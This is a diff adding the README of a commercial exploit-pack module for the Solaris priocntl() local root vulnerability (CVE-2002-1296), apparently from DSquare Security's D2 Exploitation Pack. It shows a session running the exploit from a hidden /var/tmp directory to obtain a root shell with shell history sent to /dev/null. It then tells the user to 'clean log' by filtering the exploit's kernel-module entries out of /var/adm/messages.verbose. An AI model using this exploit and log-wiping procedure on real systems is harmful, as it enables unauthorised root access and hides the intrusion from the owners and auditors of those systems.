@@ -1,0 +1,69 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2008 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+------------
+
+Solaris priocntl() System Call Local Root Vulnerability
+
+Use d2sec_priocntl. For example:
+
+$ uname -a 
+SunOS unknown 5.8 Generic_108528-14 sun4u sparc SUNW,Ultra-1 Solaris
+$ pwd
+/var/tmp/.zmanst5Etd
+$ ls
+d2sec_priocntl  lkm32  lkm64
+$ ./d2sec_priocntl
+./d2sec_priocntl `isainfo -b` `pwd`
+
+$ ./d2sec_priocntl `isainfo -b` `pwd`
+[#] success !
+# id
+uid=0(root) gid=0(root)
+# set
+BASH_HISTORY=/dev/null
+HISTFILE=/dev/null
+HISTORY=/dev/null
+IFS=    
+
+MAILCHECK=600
+OPTIND=1
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+PS1=# 
+PS2=> 
+TERM=vt100
+history=/dev/null
+# 
+
+Don't forget to clean log. For example, on our box with a quick but
+dirty method :) :
+
+# cat /var/adm/messages.verbose 
+[...]
+May  3 17:47:02 unknown lkm32: [ID 758221 kern.notice] NOTICE: Get Su: search pid=3719
+May  3 17:47:02 unknown lkm32: [ID 758221 kern.notice] NOTICE: Get Su: search pid=5685
+May  3 17:47:02 unknown lkm32: [ID 846639 kern.notice] NOTICE: Get Su: 5685
+May  3 17:47:02 unknown lkm32: [ID 846639 kern.notice] NOTICE: Get Su: 0
+May  3 17:47:02 unknown last message repeated 1 time
+[...]
+# grep -v 'lkm32' messages.verbose > .m
+# cat .m > messages.verbose
+# rm -f .m
+
+Tested on:
+	SunOS 5.8
+
+CVE Name : CVE-2002-1296
+CVE Url  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1296
+
+EOF
